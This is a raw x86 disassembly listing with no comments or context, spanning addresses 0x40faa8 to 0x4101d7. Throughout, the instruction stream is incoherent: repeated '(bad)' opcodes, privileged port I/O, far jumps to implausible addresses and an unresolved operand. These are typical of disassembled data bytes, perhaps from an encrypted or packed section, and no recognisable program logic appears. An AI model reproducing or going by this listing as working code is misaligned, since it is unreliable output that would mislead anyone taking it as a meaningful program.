  40faa8:	pop    edi
  40faa9:	sub    al,0x50
  40faab:	loop   0x40fa3b
  40faad:	push   ecx
  40faae:	pop    esi
  40faaf:	cli    
  40fab0:	fdiv   DWORD PTR [edi+0x730231c3]
  40fab6:	xchg   ebx,eax
  40fab7:	push   ebx
  40fab8:	push   0x2a
  40faba:	xor    ebp,DWORD PTR cs:[ecx+0x53]
  40fabe:	lods   al,BYTE PTR ds:[esi]
  40fabf:	sbb    BYTE PTR [eax-0x13bf120e],cl
  40fac5:	sub    eax,0x21c932e9
  40faca:	and    eax,0xa2f0aff0
  40facf:	and    ch,BYTE PTR [ecx+0x14]
  40fad2:	in     eax,dx
  40fad3:	out    0xe2,al
  40fad5:	cmp    eax,DWORD PTR [ecx+edi*4-0x3b7c9817]
  40fadc:	out    dx,eax
  40fadd:	in     al,0x65
  40fadf:	fiadd  WORD PTR [edi+0x6f]
  40fae2:	xchg   ebx,eax
  40fae3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fae4:	push   cs
  40fae5:	or     ebp,esi
  40fae7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fae8:	lahf   
  40fae9:	push   ebx
  40faea:	mov    DWORD PTR [edi+0x3781159a],ecx
  40faf0:	xlat   BYTE PTR ds:[ebx]
  40faf1:	jmp    0x40faf5
  40faf3:	js     0x40fa9c
  40faf5:	ror    edx,cl
  40faf7:	aaa    
  40faf8:	ss xor al,0xdb
  40fafb:	mov    eax,ds:0xf3f304b9
  40fb00:	mov    ebp,0xa2008a89
  40fb05:	xor    al,0x86
  40fb07:	es push 0xb5bc04a5
  40fb0d:	mov    ebp,0x74b926a9
  40fb12:	sub    dh,BYTE PTR [edi+0x54]
  40fb15:	shl    DWORD PTR [esi-0x67],1
  40fb18:	mov    eax,ds:0x1f020f04
  40fb1d:	out    0xd9,al
  40fb1f:	sub    al,dl
  40fb21:	lahf   
  40fb22:	or     al,0x29
  40fb24:	add    ebp,DWORD PTR [eax]
  40fb26:	mov    bl,dh
  40fb28:	stos   BYTE PTR es:[edi],al
  40fb29:	(bad)  
  40fb2a:	(bad)  
  40fb2b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fb2c:	bound  edi,QWORD PTR [eax+0x3e]
  40fb2f:	ins    BYTE PTR es:[edi],dx
  40fb30:	jge    0x40fb9e
  40fb32:	mov    dh,0xd8
  40fb34:	xor    eax,0x5260e46e
  40fb39:	scas   eax,DWORD PTR es:[edi]
  40fb3a:	gs sub ecx,eax
  40fb3d:	jge    0x40fb03
  40fb3f:	add    DWORD PTR [ebx],edi
  40fb41:	xchg   esi,eax
  40fb42:	push   edi
  40fb43:	je     0x40fbb4
  40fb45:	mov    al,0x5d
  40fb47:	sbb    dh,BYTE PTR [eax+0x4c]
  40fb4a:	jb     0x40fae3
  40fb4c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fb4d:	scas   eax,DWORD PTR es:[edi]
  40fb4e:	enter  0x81ca,0xd5
  40fb52:	(bad)  
  40fb53:	cwde   
  40fb54:	xor    WORD PTR [ecx-0x1f5dad17],0x4e
  40fb5c:	and    eax,0xcc084ee1
  40fb61:	inc    esp
  40fb62:	inc    ecx
  40fb63:	loop   0x40fb8b
  40fb65:	retf   0xc3df
  40fb68:	cmp    ebp,edi
  40fb6a:	int3   
  40fb6b:	das    
  40fb6c:	gs (bad) 
  40fb6f:	adc    ecx,DWORD PTR cs:[edx]
  40fb72:	pop    es
  40fb73:	pop    edi
  40fb74:	or     al,0xde
  40fb76:	dec    esi
  40fb77:	xor    eax,0x4b70bd22
  40fb7c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fb7d:	jle    0x40fb2e
  40fb7f:	mov    ebx,0x6224bcd8
  40fb84:	or     esi,ebp
  40fb86:	je     0x40fb5b
  40fb88:	sub    eax,0x14f63b17
  40fb8d:	shl    BYTE PTR cs:[esi+0xf],1
  40fb91:	call   0x102685d2
  40fb96:	jo     0x40fb2c
  40fb98:	jg     0x40fb94
  40fb9a:	cmp    al,0xec
  40fb9c:	xor    al,0x9a
  40fb9e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fb9f:	loope  0x40fb6a
  40fba1:	pmulhw mm6,QWORD PTR [edx-0xb]
  40fba5:	outs   dx,BYTE PTR ds:[esi]
  40fba6:	and    eax,0x21032e2a
  40fbab:	fistp  QWORD PTR [esi]
  40fbad:	cdq    
  40fbae:	sbb    DWORD PTR [esi+ebx*2-0x40ed6af1],ecx
  40fbb5:	xchg   esi,eax
  40fbb6:	sbb    DWORD PTR ds:0xc1f72f14,0x27ba1702
  40fbc0:	mov    esi,DWORD PTR [ebx]
  40fbc2:	cmc    
  40fbc3:	ds inc ebp
  40fbc5:	mov    ebp,?
  40fbc7:	mov    ebp,0xa2a72e4a
  40fbcc:	dec    esp
  40fbcd:	and    ecx,DWORD PTR [ecx]
  40fbcf:	push   cs
  40fbd0:	pop    ecx
  40fbd1:	jl     0x40fbbe
  40fbd3:	imul   DWORD PTR [eax]
  40fbd5:	xchg   edx,eax
  40fbd6:	inc    edx
  40fbd7:	sbb    BYTE PTR [edi+0x63],bl
  40fbda:	test   bl,ch
  40fbdc:	in     al,dx
  40fbdd:	inc    edx
  40fbde:	mov    esi,0xc28367a8
  40fbe3:	mov    ds:0x7c2d68e7,eax
  40fbe8:	push   es
  40fbe9:	shl    DWORD PTR [ebp-0x63],cl
  40fbec:	sub    BYTE PTR [ecx-0x74683bc4],bl
  40fbf2:	(bad)  
  40fbf3:	pop    edx
  40fbf4:	pop    eax
  40fbf5:	mov    ah,BYTE PTR [edi+eax*8]
  40fbf8:	add    DWORD PTR [edx+0x1],esp
  40fbfb:	push   cs
  40fbfc:	jo     0x40fb86
  40fbfe:	imul   edx,edx,0x161c2b6d
  40fc04:	ret    0x796d
  40fc07:	dec    ebp
  40fc08:	orps   xmm6,XMMWORD PTR [esi-0x53]
  40fc0c:	dec    eax
  40fc0d:	fcmovbe st,st(6)
  40fc0f:	leave  
  40fc10:	pusha  
  40fc11:	(bad)  
  40fc12:	ins    DWORD PTR es:[edi],dx
  40fc13:	cwde   
  40fc14:	cmp    BYTE PTR [eax+eax*4-0x5c],dl
  40fc18:	or     eax,0xf420e4c
  40fc1d:	iret   
  40fc1e:	and    dh,cl
  40fc20:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fc21:	pop    ds
  40fc22:	popa   
  40fc23:	cmp    BYTE PTR [edi],ch
  40fc25:	dec    edx
  40fc26:	push   es
  40fc27:	lea    eax,[ebx-0x674ab0fb]
  40fc2d:	loopne 0x40fc48
  40fc2f:	dec    esp
  40fc30:	bound  esp,QWORD PTR [eax]
  40fc32:	lods   eax,DWORD PTR ds:[esi]
  40fc33:	push   ebp
  40fc34:	mov    edx,0x53dde7e8
  40fc39:	jg     0x40fc5e
  40fc3b:	inc    ebx
  40fc3c:	xchg   esp,esi
  40fc3e:	mov    ecx,0x656f6082
  40fc43:	aas    
  40fc44:	and    DWORD PTR [eax],edx
  40fc46:	or     al,0xf3
  40fc48:	jp     0x40fca2
  40fc4a:	mov    BYTE PTR [esi-0xb],al
  40fc4d:	push   es
  40fc4e:	dec    edx
  40fc4f:	int    0x87
  40fc51:	xor    BYTE PTR [ebp+0x58],0x29
  40fc55:	inc    eax
  40fc56:	cmp    bh,dh
  40fc58:	dec    esi
  40fc59:	mov    eax,0x30c9b6e
  40fc5e:	out    dx,al
  40fc5f:	loop   0x40fc20
  40fc61:	dec    esi
  40fc62:	lock adc DWORD PTR [eax+0x70],edx
  40fc66:	push   0x8e139f4f
  40fc6b:	jns    0x40fc42
  40fc6d:	mov    BYTE PTR [edi-0x4b],ch
  40fc70:	or     BYTE PTR [esi-0x854665c],ch
  40fc76:	mov    BYTE PTR [eax+edx*8+0x615d15db],al
  40fc7d:	inc    ecx
  40fc7e:	ret    
  40fc7f:	jbe    0x40fc1f
  40fc81:	push   edx
  40fc82:	jle    0x40fc5a
  40fc84:	js     0x40fc21
  40fc86:	das    
  40fc87:	out    dx,al
  40fc88:	pusha  
  40fc89:	adc    bl,BYTE PTR [esi]
  40fc8b:	jmp    0x40fcbe
  40fc8d:	mov    dh,0x71
  40fc8f:	push   ss
  40fc90:	cld    
  40fc91:	push   eax
  40fc92:	xchg   esp,eax
  40fc93:	sub    eax,DWORD PTR [edi]
  40fc95:	push   ss
  40fc96:	lahf   
  40fc97:	and    eax,0xc30fae90
  40fc9c:	das    
  40fc9d:	aam    0x61
  40fc9f:	push   ebp
  40fca0:	inc    ebp
  40fca1:	inc    ebp
  40fca2:	nop
  40fca3:	and    dl,ch
  40fca5:	cmc    
  40fca6:	push   ss
  40fca7:	dec    edx
  40fca8:	add    ebp,DWORD PTR [ebp+0x37bc98b]
  40fcae:	aam    0x1a
  40fcb0:	int3   
  40fcb1:	mov    ds:0x831335e7,al
  40fcb6:	pop    ss
  40fcb7:	jmp    eax
  40fcb9:	mov    ds:0x4ea446e6,eax
  40fcbe:	jl     0x40fd14
  40fcc0:	mov    eax,0x466797a6
  40fcc5:	psubq  mm2,mm2
  40fcc8:	fdiv   st,st(5)
  40fcca:	out    dx,eax
  40fccb:	mov    DWORD PTR [ebx-0x5d],ebx
  40fcce:	fwait
  40fccf:	mov    edx,DWORD PTR [edx]
  40fcd1:	jbe    0x40fcb4
  40fcd3:	jo     0x40fc8b
  40fcd5:	cdq    
  40fcd6:	lods   eax,DWORD PTR ds:[esi]
  40fcd7:	ret    
  40fcd8:	repz cmc 
  40fcda:	push   es
  40fcdb:	pop    ebp
  40fcdc:	pop    es
  40fcdd:	imul   esp,edi,0xffffffdb
  40fce0:	push   ss
  40fce1:	jne    0x40fcbf
  40fce3:	loopne 0x40fcfd
  40fce5:	data16 xchg BYTE PTR [ecx+0x17],bl
  40fce9:	loopne 0x40fd09
  40fceb:	jl     0x40fc84
  40fced:	mov    bh,0xda
  40fcef:	sbb    al,0x88
  40fcf1:	pusha  
  40fcf2:	jb     0x40fcbb
  40fcf4:	outs   dx,DWORD PTR ds:[esi]
  40fcf5:	mov    dh,0x6
  40fcf7:	into   
  40fcf8:	xor    ecx,ebp
  40fcfa:	mov    bh,0x7a
  40fcfc:	es retf 0x6595
  40fd00:	loope  0x40fcba
  40fd02:	and    BYTE PTR [edi+0x68e51ec7],dh
  40fd08:	jo     0x40fd42
  40fd0a:	out    dx,eax
  40fd0b:	mov    al,ds:0x64b7e42b
  40fd10:	pop    ds
  40fd11:	xchg   edx,eax
  40fd12:	xchg   ecx,eax
  40fd13:	test   eax,0xe0210f33
  40fd18:	sbb    DWORD PTR [ecx],ebx
  40fd1a:	cmp    edi,DWORD PTR [edx+ebp*1]
  40fd1d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fd1e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fd1f:	mov    BYTE PTR [ecx+0x1e],dh
  40fd22:	sbb    bl,BYTE PTR [edx+0x18ecdfdb]
  40fd28:	or     al,0xfe
  40fd2a:	and    bh,dl
  40fd2c:	repnz fistp WORD PTR [ebx]
  40fd2f:	jb     0x40fce2
  40fd31:	ror    DWORD PTR [edx+0x6d],1
  40fd34:	ja     0x40fd7c
  40fd36:	push   ds
  40fd37:	in     eax,0xb4
  40fd39:	xchg   esp,eax
  40fd3a:	cs jo  0x40fcf5
  40fd3d:	xor    al,0x6a
  40fd3f:	jp     0x40fd4f
  40fd41:	cmp    al,0xdb
  40fd43:	or     ebp,DWORD PTR [edi+0x73]
  40fd46:	out    dx,al
  40fd47:	(bad)
  40fd4a:	fwait
  40fd4b:	mov    BYTE PTR [eax+ecx*1-0x3d],al
  40fd4f:	aas    
  40fd50:	xchg   edi,eax
  40fd51:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fd52:	cli    
  40fd53:	outs   dx,BYTE PTR ds:[esi]
  40fd54:	js     0x40fcf6
  40fd56:	imul   edx,DWORD PTR ds:0xd9f0d7f6,0xceed24bb
  40fd60:	push   edx
  40fd61:	add    DWORD PTR [ebx],edx
  40fd63:	push   ebx
  40fd64:	and    esi,DWORD PTR [ebx]
  40fd66:	add    al,0x44
  40fd68:	loopne 0x40fd05
  40fd6a:	jne    0x40fdc5
  40fd6c:	inc    esp
  40fd6d:	dec    ecx
  40fd6e:	retf   
  40fd6f:	fcmove st,st(3)
  40fd71:	xchg   edi,eax
  40fd72:	(bad)  
  40fd73:	aad    0xff
  40fd75:	inc    ebp
  40fd76:	mov    ebp,0xf057ff57
  40fd7b:	add    DWORD PTR ds:0xfe5b526c,esp
  40fd81:	lods   eax,DWORD PTR ds:[esi]
  40fd82:	pop    ecx
  40fd83:	and    bl,BYTE PTR [ebx+0x5a]
  40fd86:	and    eax,0xc67895f6
  40fd8b:	fwait
  40fd8c:	push   eax
  40fd8d:	in     al,dx
  40fd8e:	mov    DWORD PTR [ecx-0x8],esi
  40fd91:	fsubr  QWORD PTR [edx]
  40fd93:	and    eax,0x80f3b228
  40fd98:	add    dh,BYTE PTR [ebx+0x77]
  40fd9b:	push   ebp
  40fd9c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fd9d:	mov    bh,0xb3
  40fd9f:	xchg   edi,eax
  40fda0:	mov    edi,0x6f09c4a7
  40fda5:	mov    ah,0x6e
  40fda7:	inc    esp
  40fda8:	pop    ebp
  40fda9:	jecxz  0x40fddd
  40fdab:	mov    DWORD PTR [di],ebp
  40fdae:	and    edi,DWORD PTR [ebx+ebx*1-0x6d]
  40fdb2:	sub    ah,BYTE PTR [edx+0x16]
  40fdb5:	jl     0x40fd48
  40fdb7:	cdq    
  40fdb8:	dec    ecx
  40fdb9:	fst    QWORD PTR [edi+0x73539964]
  40fdbf:	ret    0xb58e
  40fdc2:	cdq    
  40fdc3:	sar    BYTE PTR [eax+0x49],0x2e
  40fdc7:	sbb    edi,eax
  40fdc9:	out    0x93,eax
  40fdcb:	mov    ch,0x78
  40fdcd:	mov    al,0xf7
  40fdcf:	nop
  40fdd0:	ret    
  40fdd1:	cmp    eax,esi
  40fdd3:	mov    ss,ebp
  40fdd5:	adc    bl,BYTE PTR [eax-0x5f]
  40fdd8:	pop    ebp
  40fdd9:	sub    bl,al
  40fddb:	and    eax,0x17f3d293
  40fde0:	xlat   BYTE PTR ds:[ebx]
  40fde1:	fidiv  DWORD PTR [edx+0xc]
  40fde4:	jne    0x40fe16
  40fde6:	outs   dx,DWORD PTR ds:[esi]
  40fde7:	ret    0x4fb5
  40fdea:	fucomi st,st(3)
  40fdec:	pop    esi
  40fded:	scas   eax,DWORD PTR es:[edi]
  40fdee:	shl    ebx,0xc5
  40fdf1:	pop    ebp
  40fdf2:	fcom   st(7)
  40fdf4:	mov    bh,0xce
  40fdf6:	ss loopne 0x40fe74
  40fdf9:	add    BYTE PTR [ebp+edx*4-0x4e],bh
  40fdfd:	retf   
  40fdfe:	popf   
  40fdff:	or     bh,BYTE PTR [eax+0x4e6a304e]
  40fe05:	test   eax,0x613d259e
  40fe0a:	adc    al,0xb
  40fe0c:	and    eax,0xcc5615c
  40fe11:	ror    BYTE PTR [esp+esi*4+0x89a090a],1
  40fe18:	mov    edx,DWORD PTR [ebx+edx*2]
  40fe1b:	xlat   BYTE PTR ds:[ebx]
  40fe1c:	mov    BYTE PTR [ecx-0x481fd743],ah
  40fe22:	jl     0x40fe1d
  40fe24:	pop    edi
  40fe25:	xchg   ebx,eax
  40fe26:	inc    esp
  40fe27:	fs test bh,0xea
  40fe2b:	je     0x40fe41
  40fe2d:	pop    es
  40fe2e:	dec    ecx
  40fe2f:	adc    BYTE PTR [edi+0x6175ff8d],bl
  40fe35:	inc    edi
  40fe36:	dec    esp
  40fe37:	in     eax,dx
  40fe38:	or     BYTE PTR [edi],0xdb
  40fe3b:	inc    esp
  40fe3c:	in     eax,0x2e
  40fe3e:	pop    es
  40fe3f:	popf   
  40fe40:	outs   dx,BYTE PTR ds:[esi]
  40fe41:	add    dl,ah
  40fe43:	or     BYTE PTR [ecx],0x4
  40fe46:	addr16 pop ebx
  40fe48:	ret    0x9ac4
  40fe4b:	and    eax,0x835e06ac
  40fe50:	sahf   
  40fe51:	sahf   
  40fe52:	inc    edx
  40fe53:	jae    0x40fe06
  40fe55:	xchg   dl,ch
  40fe57:	inc    ebp
  40fe58:	sub    eax,0xb9c02417
  40fe5d:	jmp    0x1e970ab1
  40fe62:	ret    0x9934
  40fe65:	cdq    
  40fe66:	ds mul ebp
  40fe69:	into   
  40fe6a:	jmp    0x8eb8:0xb4f46fcc
  40fe71:	fwait
  40fe72:	pop    eax
  40fe73:	jns    0x40fe03
  40fe75:	rcl    DWORD PTR [eax+0x61],cl
  40fe78:	ss loop 0x40fe8b
  40fe7b:	pop    ebp
  40fe7c:	jno    0x40fe1b
  40fe7e:	xchg   ebx,eax
  40fe7f:	jle    0x40fe45
  40fe81:	pop    esp
  40fe82:	pop    ecx
  40fe83:	dec    edx
  40fe84:	push   ebp
  40fe85:	xor    dl,BYTE PTR [eax-0x71]
  40fe88:	fisttp QWORD PTR [eax-0x2f48727a]
  40fe8e:	in     eax,0x96
  40fe90:	mov    cl,0x94
  40fe92:	xor    al,0x9
  40fe94:	mov    ch,0xbd
  40fe96:	(bad)  
  40fe97:	std    
  40fe98:	aam    0xdb
  40fe9a:	mov    al,ds:0x3d76f428
  40fe9f:	mov    esi,0x99cef0d0
  40fea4:	and    ebp,DWORD PTR [edx+0x7c6428f7]
  40feaa:	pop    ss
  40feab:	add    al,0x58
  40fead:	xor    al,0x33
  40feaf:	xchg   esp,eax
  40feb0:	aas    
  40feb1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40feb2:	stc    
  40feb3:	jns    0x40fe47
  40feb5:	adc    ah,BYTE PTR [edi+0x41]
  40feb8:	xchg   edx,esp
  40feba:	xor    DWORD PTR [edi-0x1f],0xe37a9769
  40fec1:	and    edx,DWORD PTR [edi]
  40fec3:	sbb    eax,0xbed37cfb
  40fec8:	cmp    ch,BYTE PTR [edx+0x30]
  40fecb:	stos   DWORD PTR es:[edi],eax
  40fecc:	xchg   edx,eax
  40fecd:	ja     0x40ff22
  40fecf:	jecxz  0x40fea9
  40fed1:	repnz enter 0xbae,0xa6
  40fed6:	xchg   edi,eax
  40fed7:	cmp    DWORD PTR [edi-0x3090100b],ecx
  40fedd:	repnz pop esp
  40fedf:	push   ecx
  40fee0:	cmc    
  40fee1:	stc    
  40fee2:	mov    ebx,DWORD PTR [eax+ebp*2-0x49]
  40fee6:	sub    edx,DWORD PTR [esi]
  40fee8:	iret   
  40fee9:	pcmpgtd mm7,QWORD PTR [edx-0x71]
  40feed:	jne    0x40feea
  40feef:	int3   
  40fef0:	loope  0x40fe83
  40fef2:	jmp    0x40ff2c
  40fef4:	leave  
  40fef5:	inc    edx
  40fef6:	xchg   ebp,eax
  40fef7:	or     al,0x1e
  40fef9:	mov    ch,0xe8
  40fefb:	mov    ebp,0x85f53575
  40ff00:	add    esi,DWORD PTR [edi+ebx*4-0x55583635]
  40ff07:	in     eax,0xc
  40ff09:	push   es
  40ff0a:	jg     0x40feb5
  40ff0c:	xor    dl,cl
  40ff0e:	pop    esp
  40ff0f:	ror    DWORD PTR gs:[edx+0x1c94b5ea],0x2b
  40ff17:	mov    ch,0x65
  40ff19:	dec    edi
  40ff1a:	mov    ebx,DWORD PTR [ebp-0x70]
  40ff1d:	add    eax,DWORD PTR [edx+0x29500c09]
  40ff23:	ins    BYTE PTR es:[edi],dx
  40ff24:	cmp    edx,DWORD PTR [edx]
  40ff26:	(bad)  
  40ff27:	sbb    ah,BYTE PTR [ecx+0x6bc2f3bd]
  40ff2d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ff2e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ff2f:	mov    dh,0xc0
  40ff31:	ja     0x40feec
  40ff33:	(bad)  
  40ff34:	add    DWORD PTR ds:0x1de8d29d,ebx
  40ff3a:	fcom   DWORD PTR [eax]
  40ff3c:	sti    
  40ff3d:	aaa    
  40ff3e:	(bad)  
  40ff3f:	dec    ebp
  40ff40:	(bad)  
  40ff41:	xor    eax,0x6e505b7e
  40ff46:	retf   0xda84
  40ff49:	mov    ds:0x11e39da,al
  40ff4e:	cld    
  40ff4f:	cmp    eax,0x458e22d8
  40ff54:	mov    ecx,0xe01c509e
  40ff59:	add    al,0xfe
  40ff5b:	xchg   DWORD PTR [ebp+0x21],ebx
  40ff5e:	stos   DWORD PTR es:[edi],eax
  40ff5f:	shl    ch,0xa8
  40ff62:	cmp    DWORD PTR [ecx-0x2e],ebx
  40ff65:	jmp    0x7a8e8a33
  40ff6a:	gs int3 
  40ff6c:	push   ss
  40ff6d:	lods   al,BYTE PTR ds:[esi]
  40ff6e:	or     edi,DWORD PTR [esi-0x5]
  40ff71:	mov    bl,0xc9
  40ff73:	mov    ebp,eax
  40ff75:	std    
  40ff76:	adc    bh,BYTE PTR [ebx]
  40ff78:	inc    edi
  40ff79:	sub    ah,BYTE PTR [ebp-0x1c]
  40ff7c:	xchg   esp,eax
  40ff7d:	dec    edx
  40ff7e:	sbb    esi,DWORD PTR [ebx+0x36a26adc]
  40ff84:	(bad)  
  40ff85:	push   0x4f64145e
  40ff8a:	jge    0x41000b
  40ff8c:	test   BYTE PTR [ebp-0x159f84c7],ah
  40ff92:	ins    BYTE PTR es:[edi],dx
  40ff93:	add    ebx,DWORD PTR [eax-0x42e1f3d4]
  40ff99:	mov    eax,0xbd2a3294
  40ff9e:	fsubr  DWORD PTR [eax-0x398c9c74]
  40ffa4:	adc    BYTE PTR [esi],bl
  40ffa6:	lock lea ebp,es:[edx-0x7d5997a8]
  40ffae:	xchg   edx,eax
  40ffaf:	rcl    DWORD PTR [eax-0x67],0xe
  40ffb3:	lahf   
  40ffb4:	or     BYTE PTR [edx-0x13],ch
  40ffb7:	and    al,0xdf
  40ffb9:	ret    
  40ffba:	pop    esp
  40ffbb:	pop    ds
  40ffbc:	lds    edx,FWORD PTR [esp+ebx*2-0x581db7e0]
  40ffc3:	dec    edi
  40ffc4:	push   eax
  40ffc5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ffc6:	push   ds
  40ffc7:	repnz dec ebp
  40ffc9:	jnp    0x40ffe1
  40ffcb:	sub    DWORD PTR [ecx+0x4c368425],0x987dea45
  40ffd5:	leave  
  40ffd6:	mov    esi,0xb30a96e0
  40ffdb:	jg     0x7ce0ed31
  40ffe1:	shl    ebp,0x50
  40ffe4:	push   ss
  40ffe5:	test   al,0x74
  40ffe7:	mov    esp,0x7faa13a3
  40ffec:	push   ds
  40ffed:	call   0xc46b:0xb20296b7
  40fff4:	dec    eax
  40fff5:	pusha  
  40fff6:	pop    ss
  40fff7:	mov    ecx,0x9e85cbb4
  40fffc:	cmp    dl,BYTE PTR [esi+0x504f52f8]
  410002:	xchg   esp,eax
  410003:	test   DWORD PTR ds:0xfa4ec83b,edx
  410009:	jmp    0x410039
  41000b:	iret   
  41000c:	adc    cl,BYTE PTR [esi+eax*2]
  41000f:	ss push edx
  410011:	cmp    ebx,DWORD PTR [ecx]
  410013:	and    BYTE PTR [ebp-0x37fbbbb3],0x61
  41001a:	imul   ebx,DWORD PTR [esi+0x36d674df],0xef6585ee
  410024:	xor    ecx,DWORD PTR [esi-0x3f]
  410027:	dec    ebp
  410028:	outs   dx,DWORD PTR ds:[esi]
  410029:	cmp    BYTE PTR [edi-0x26],0xa3
  41002d:	sub    BYTE PTR [ecx+edi*4+0x3c6fff4b],dl
  410034:	cmp    DWORD PTR [ebx+0x9],edx
  410037:	and    cl,BYTE PTR [edi]
  410039:	cmp    DWORD PTR [edi+ebx*8-0x31f680aa],esi
  410040:	inc    edi
  410041:	inc    edi
  410042:	lods   eax,DWORD PTR ds:[esi]
  410043:	pushf  
  410044:	pop    esi
  410045:	xchg   ecx,eax
  410046:	or     ah,al
  410048:	dec    esp
  410049:	mov    BYTE PTR [ebp+0xe],bl
  41004c:	and    DWORD PTR [edx-0x3917a666],ecx
  410052:	or     al,BYTE PTR [ecx]
  410054:	aaa    
  410055:	sub    eax,0xb67fdd9
  41005a:	daa    
  41005b:	pop    ds
  41005c:	cmp    al,0x75
  41005e:	push   eax
  41005f:	sahf   
  410060:	test   ch,ch
  410062:	push   ebp
  410063:	scas   al,BYTE PTR es:[edi]
  410064:	int3   
  410065:	in     al,dx
  410066:	mov    ebp,0xf5fd8c16
  41006b:	ins    DWORD PTR es:[edi],dx
  41006c:	mov    edx,0xbda7c4b2
  410071:	pop    edi
  410072:	lods   eax,DWORD PTR ds:[esi]
  410073:	std    
  410074:	rcl    DWORD PTR [ecx+0x25],1
  410077:	test   DWORD PTR [ebx],0x9ee488b3
  41007d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41007e:	mov    ds:0xebdb7cd4,al
  410083:	shl    BYTE PTR [ebx],1
  410085:	mov    DWORD PTR [edx-0x570060fc],ebx
  41008b:	inc    eax
  41008c:	repnz sbb esp,esi
  41008f:	scas   al,BYTE PTR es:[edi]
  410090:	test   DWORD PTR [ebp-0x47],0x76a2da8e
  410097:	sbb    dh,bh
  410099:	push   cs
  41009a:	mov    bh,0x47
  41009c:	cmp    BYTE PTR [ecx],cl
  41009e:	hlt    
  41009f:	or     eax,0x3e5acb07
  4100a4:	or     DWORD PTR [esi],edi
  4100a6:	pop    ebp
  4100a7:	xchg   edi,eax
  4100a8:	add    BYTE PTR [edi],ch
  4100aa:	ret    0xfe6c
  4100ad:	sub    DWORD PTR [ebp+edx*4+0x796268d7],ebp
  4100b4:	push   eax
  4100b5:	sub    al,BYTE PTR [esi+0x3c]
  4100b8:	cdq    
  4100b9:	call   0xbf675fc8
  4100be:	fiadd  WORD PTR [edi+ebx*8-0xb9f26cd]
  4100c5:	(bad)  
  4100c7:	shl    dh,0xa4
  4100ca:	cmovb  edi,DWORD PTR [ebx]
  4100cd:	adc    BYTE PTR [ebx],cl
  4100cf:	or     BYTE PTR [eax],ah
  4100d1:	cmp    DWORD PTR [ecx+edi*4-0x41969fb2],esi
  4100d8:	out    dx,eax
  4100d9:	sub    al,0xa6
  4100db:	cli    
  4100dc:	leave  
  4100dd:	jg     0x4100b2
  4100df:	adc    ebx,DWORD PTR [esi+0x6ace3166]
  4100e5:	ror    DWORD PTR [ecx+0x23],0x84
  4100e9:	sbb    ah,BYTE PTR [edx+edi*4-0x65469767]
  4100f0:	jns    0x41007e
  4100f2:	jl     0x410092
  4100f4:	daa    
  4100f5:	pop    esp
  4100f6:	push   0x71db98e3
  4100fb:	ror    BYTE PTR [ecx-0x354affba],1
  410101:	sub    esp,ebx
  410103:	sahf   
  410104:	mov    ebx,0xc4e99520
  410109:	push   eax
  41010a:	(bad)  
  41010b:	(bad)  
  41010c:	and    ch,BYTE PTR [edi]
  41010e:	lock jmp 0x41011c
  410111:	add    al,cl
  410113:	fbstp  TBYTE PTR [edx+esi*2]
  410116:	mov    eax,0x329ef02f
  41011b:	lea    esi,[ebp+0x79]
  41011e:	fldlg2 
  410120:	and    ch,BYTE PTR [ecx+ebp*8-0x2302edba]
  410127:	and    dh,BYTE PTR [edx-0x6a]
  41012a:	and    BYTE PTR [esi+0xfdb7957],dh
  410130:	add    ch,BYTE PTR [esi+0x7b]
  410133:	jle    0x4100d2
  410135:	pop    esp
  410136:	sub    eax,0x322f0b2e
  41013b:	push   eax
  41013c:	fwait
  41013d:	adc    eax,0x8396dd38
  410142:	jp     0x410182
  410144:	mov    cl,0x26
  410146:	sub    dh,BYTE PTR [ebp+0xa]
  410149:	jle    0x410110
  41014b:	repz cmp DWORD PTR [edx+0x18],edi
  41014f:	sbb    BYTE PTR ds:0xfaf7e1ac,ah
  410155:	inc    esp
  410156:	or     eax,0xe532fba0
  41015b:	lahf   
  41015c:	int3   
  41015d:	(bad)  
  41015e:	test   BYTE PTR [ebp+0x68],0x26
  410162:	cwde   
  410163:	cmp    edi,ebp
  410165:	adc    DWORD PTR [ebx+0x31],edx
  410168:	xor    BYTE PTR [ebp-0x52],0x2f
  41016c:	mov    edx,0x9c983536
  410171:	add    al,0x7
  410173:	inc    eax
  410174:	push   esi
  410175:	std    
  410176:	dec    ebp
  410177:	out    dx,eax
  410178:	jne    0x41015a
  41017a:	jae    0x410128
  41017c:	pop    ds
  41017d:	shl    BYTE PTR [ebp+0x2c3a6f8a],0x9b
  410184:	es jle 0x4101e6
  410187:	xchg   edi,eax
  410188:	imul   ebx,esp,0xcfbb7e99
  41018e:	lods   eax,DWORD PTR ds:[esi]
  41018f:	jbe    0x410118
  410191:	outs   dx,BYTE PTR ds:[esi]
  410192:	add    edi,ebx
  410194:	stos   BYTE PTR es:[edi],al
  410195:	adc    eax,0x6b719c8e
  41019a:	shl    BYTE PTR [edi+0xb2c231a],0x8b
  4101a1:	push   ss
  4101a2:	push   edi
  4101a3:	cdq    
  4101a4:	daa    
  4101a5:	xchg   ecx,eax
  4101a6:	inc    edx
  4101a7:	inc    ecx
  4101a8:	ds jnp 0x4101bc
  4101ab:	jg     0x105970c
  4101b1:	cwde   
  4101b2:	xor    eax,0x7522f8e3
  4101b7:	lods   eax,DWORD PTR ds:[esi]
  4101b8:	jae    0x410220
  4101ba:	xchg   ecx,eax
  4101bb:	sub    BYTE PTR [ebx+0x51d27156],al
  4101c1:	lock push ebp
  4101c3:	cmp    DWORD PTR [esi+0x58d6eff2],ebp
  4101c9:	pop    edx
  4101ca:	nop
  4101cb:	sahf   
  4101cc:	mov    ecx,0xdf3940a3
  4101d1:	cdq    
  4101d2:	sbb    eax,0x48b0b18d
  4101d7:	dec    esi
